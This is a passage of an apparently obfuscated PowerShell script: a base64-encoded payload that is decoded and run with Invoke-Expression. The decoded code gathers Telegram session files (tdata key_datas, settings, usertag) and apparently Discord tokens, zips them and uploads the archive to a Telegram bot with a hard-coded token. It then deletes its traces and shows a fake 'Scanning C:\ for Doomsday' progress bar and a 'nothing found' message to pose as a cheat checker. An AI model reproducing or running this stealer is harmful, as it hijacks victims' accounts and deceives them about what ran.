CAgICBpZiAoVGVzdC1QYXRoIC1QYXRoICRpdGVtIC1QYXRoVHlwZSBMZWFmKSB7DQogICAgICAgICAgICAgICAgICAgICMg0JrQvtC/0LjRgNGD0LXQvCDRhNCw0LnQuw0KICAgICAgICAgICAgICAgICAgICBDb3B5LUl0ZW0gLVBhdGggJGl0ZW0gLURlc3RpbmF0aW9uIChKb2luLVBhdGggLVBhdGggJGRlc3RpbmF0aW9uIC1DaGlsZFBhdGggKFNwbGl0LVBhdGggLUxlYWYgJGl0ZW0pKQ0KICAgICAgICAgICAgICAgIH0gZWxzZWlmIChUZXN0LVBhdGggLVBhdGggJGl0ZW0gLVBhdGhUeXBlIENvbnRhaW5lcikgew0KICAgICAgICAgICAgICAgICAgICAjINCa0L7Qv9C40YDRg9C10Lwg0L/QsNC/0LrRgw0KICAgICAgICAgICAgICAgICAgICBDb3B5LUl0ZW0gLVBhdGggJGl0ZW0gLURlc3RpbmF0aW9uIChKb2luLVBhdGggLVBhdGggJGRlc3RpbmF0aW9uIC1DaGlsZFBhdGggKFNwbGl0LVBhdGggLUxlYWYgJGl0ZW0pKSAtUmVjdXJzZQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgI1NlbmQtV2ViaG9vayAtVGV4dCAi0KTQsNC50LvRiyDQuCDQv9Cw0L/QutC4INGD0YHQv9C10YjQvdC+INGB0LrQvtC/0LjRgNC+0LLQsNC90YsuIiAtRm9yZWdyb3VuZENvbG9yIEdyZWVuDQogICAgICAgIH0gY2F0Y2ggew0KICAgICAgICAgICAgI1NlbmQtV2ViaG9vayAtVGV4dCAi0J7RiNC40LHQutCwINC/0YDQuCDQutC+0L/QuNGA0L7QstCw0L3QuNC4OiAkXyIgLUZvcmVncm91bmRDb2xvciBSZWQNCiAgICAgICAgfQ0KICAgIH0NCn0NCg0KJGZpbGVQYXRoc3NzcyA9IEAoDQogICAgIiR0ZGF0YVxrZXlfZGF0YXMuYmluIiwNCiAgICAiJHRkYXRhXHNldHRpbmdzcyIsDQogICAgIiR0ZGF0YVx1c2VydGFnIg0KKQ0KDQpmb3JlYWNoICgkZjIgaW4gJGZpbGVQYXRoc3Nzcykgew0KICAgIGlmIChUZXN0LVBhdGggLVBhdGggJGYyIC1QYXRoVHlwZSBMZWFmKSB7DQogICAgICAgIENvcHktSXRlbSAtUGF0aCAkZjIgLURlc3RpbmF0aW9uICRkZXN0aW5hdGlvbg0KICAgIH0gZWxzZWlmIChUZXN0LVBhdGggLVBhdGggJGYyIC1QYXRoVHlwZSBDb250YWluZXIpIHsNCiAgICAgICAgQ29weS1JdGVtIC1QYXRoICRmMiAtRGVzdGluYXRpb24gJGRlc3RpbmF0aW9uIC1SZWN1cnNlDQogICAgfQ0KfQ0KDQojIyAtLS0gLy8gWklQIEFSQ0hJVkUgQ1JFQVRJTkcgXFwgLS0tICMjDQp0cnkgew0KICAgIENvbXByZXNzLUFyY2hpdmUgLVBhdGggIiR0ZW1wRm9sZGVyXCoiIC1EZXN0aW5hdGlvblBhdGggJHppcEZpbGVQYXRoIC1Gb3JjZQ0KfSBjYXRjaCB7DQogICAgcmV0dXJuDQp9DQoNCiMjIC0tLSAvLyBUZWxlZ3JhbSBBUEkgXFwgLS0tICMjCiRib3RUb2tlbiA9ICI4MTIwNDcyOTAxOkFBRVF4cGxzOGtrc1BFZnd5UzlaMjJYVWJ6LVVBUFZTSHZFIgokY2hhdElkID0gIi0xMDAyMzg4NDY3Njk3IgokYXBpVXJsID0gImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3QkYm90VG9rZW4vc2VuZERvY3VtZW50IgoKJGh0dHBDbGllbnQgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuSHR0cC5IdHRwQ2xpZW50CiRjb250ZW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0Lkh0dHAuTXVsdGlwYXJ0Rm9ybURhdGFDb250ZW50CgokY29udGVudC5BZGQoKE5ldy1PYmplY3QgU3lzdGVtLk5ldC5IdHRwLlN0cmluZ0NvbnRlbnQoJGNoYXRJZCkpLCAiY2hhdF9pZCIpCgokZmlsZVN0cmVhbSA9IFtTeXN0ZW0uSU8uRmlsZV06Ok9wZW5SZWFkKCR6aXBGaWxlUGF0aCkKJGZpbGVDb250ZW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0Lkh0dHAuU3RyZWFtQ29udGVudCgkZmlsZVN0cmVhbSkKJGZpbGVDb250ZW50LkhlYWRlcnMuQ29udGVudFR5cGUgPSBbU3lzdGVtLk5ldC5IdHRwLkhlYWRlcnMuTWVkaWFUeXBlSGVhZGVyVmFsdWVdOjpQYXJzZSgiYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtIikKCiRjb250ZW50LkFkZCgkZmlsZUNvbnRlbnQsICJkb2N1bWVudCIsIChTcGxpdC1QYXRoICR6aXBGaWxlUGF0aCAtTGVhZikpCgokcmVzcG9uc2UgPSAkaHR0cENsaWVudC5Qb3N0QXN5bmMoJGFwaVVybCwgJGNvbnRlbnQpLlJlc3VsdAokcmVzcG9uc2VDb250ZW50ID0gJHJlc3BvbnNlLkNvbnRlbnQuUmVhZEFzU3RyaW5nQXN5bmMoKS5SZXN1bHQKCldyaXRlLU91dHB1dCAkcmVzcG9uc2VDb250ZW50CgojINCX0LDQutGA0YvQstCw0LXQvCDQv9C+0YLQvtC6INGE0LDQudC70LAKJGZpbGVTdHJlYW0uRGlzcG9zZSgpCiRodHRwQ2xpZW50LkRpc3Bvc2UoKQ0KDQojIyAtLS0gLy8gRW5kaW5nICYgVmlzdWFsIFxcIC0tLSAjIw0KUmVtb3ZlLUl0ZW0gJHppcEZpbGVQYXRoIC1Gb3JjZQ0KJGFhYTEyMyA9ICIkZW52OlRFTVBcZGlzY29yZF90b2tlbnMudHh0Ig0KaWYgKFRlc3QtUGF0aCAtUGF0aCAkYWFhMTIzKSB7DQogICAgUmVtb3ZlLUl0ZW0gIiRlbnY6VEVNUFxkaXNjb3JkX3Rva2Vucy50eHQiIC1Gb3JjZQ0KfQ0KV3JpdGUtT3V0cHV0ICLigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJQiDQpXcml0ZS1PdXRwdXQgIiAiDQpXcml0ZS1PdXRwdXQgIiBAIEN1cnJlbnQgdGFzazogICAgU2Nhbm5pbmcgQzpcIGZvciBEb29tc2RheSINCiRwcm9ncmVzc0Jhckxlbmd0aCA9IDUwDQokaSA9IDANCmZvciAoOyAkaSAtbGUgJHByb2dyZXNzQmFyTGVuZ3RoOyAkaSsrKSB7DQogICAgJHByb2dyZXNzQmFyID0gIlsiICsgKCI9IiAqICRpKS5QYWRSaWdodCgkcHJvZ3Jlc3NCYXJMZW5ndGgpICsgIl0iDQogICAgV3JpdGUtSG9zdCAtTm9OZXdsaW5lICJgciRwcm9ncmVzc0JhciAoJChbbWF0aF06OlJvdW5kKCgkaSAvICRwcm9ncmVzc0Jhckxlbmd0aCkgKiAxMDApKSklIg0KICAgIFN0YXJ0LVNsZWVwIC1NaWxsaXNlY29uZHMgMjAwDQp9DQpXcml0ZS1PdXRwdXQgIiAiDQpXcml0ZS1PdXRwdXQgIuKAlOKAlOKAlOKAlOKAlOKAlOKAlOKAlOKAlOKAlOKAlOKAlOKAlOKAlOKAlOKAlOKAlOKAlOKAlOKAlOKAlOKAlOKAlOKAlOKAlOKAlOKAlOKAlOKAlOKAlOKAlOKAlOKAlOKAlOKAlOKAlOKAlOKAlOKAlOKAlOKAlOKAlOKAlOKAlOKAlOKAlOKAlOKAlOKAlOKAlOKAlOKAlOKAlOKAlOKAlOKAlOKAlOKAlOKAlCINCg0KV3JpdGUtT3V0cHV0ICIgIg0KV3JpdGUtSG9zdCAiU3RvcHBlZC4gRG9vbXNkYXkg0Lgg0L/RgNC+0YfQuNC1INGB0LrRgNGL0YLRi9C1INCf0J4g0L3QtSDQvdCw0LnQtNC10L3RiyIgLUZvcmVncm91bmRDb2xvciBHcmVlbg0KDQpQYXVzZQ0KU3RhcnQtU2xlZXAgLVNlY29uZHMgMg0KZXhpdA=="))
Invoke-Expression $ASJF7087hD28C01H64Cm132864cnH1N947981UYOFSUGYSDOIGYOSDFUGJIYSDGYOSDFYGSODUFYGJSUFYGASJF7087hD28C01H64Cm132864cnH1N947981UYOFSUGYSDOIGYOSDFUGJIYSDGYOSDFYGSODUFYGJSUFYGASJF7087hD28C01H64Cm132864cnH1N947981UYOFSUGYSDOIGYOSDFUGJIYSDGYOSDFYGSODUFYGJSUFYGASJF7087hD28C01H64Cm132864cnH1N947981UYOFSUGYSDOIGYOSDFUGJIYSDGYOSDFYGSODUFYGJSUFYG
